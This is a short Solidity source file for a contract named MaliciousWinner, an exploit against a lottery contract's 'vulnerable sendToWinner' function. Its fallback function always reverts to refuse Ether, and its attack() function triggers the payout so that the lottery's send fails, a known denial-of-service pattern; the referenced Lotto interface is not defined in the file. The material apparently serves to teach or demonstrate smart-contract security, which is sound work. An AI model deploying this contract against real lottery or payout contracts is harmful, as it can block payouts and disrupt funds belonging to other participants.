pragma solidity ^0.6.4;

contract MaliciousWinner {
    // Lotto contract address
    address public lotto;

    // Constructor to set the Lotto contract address
    constructor(address _lotto) public {
        lotto = _lotto;
    }

    // Fallback function that deliberately fails
    fallback() external payable {
        revert("I refuse Ether!");
    }

    // Function to trigger the exploit
    function attack() public {
        // Call the vulnerable sendToWinner function
        Lotto(lotto).sendToWinner();
    }
}
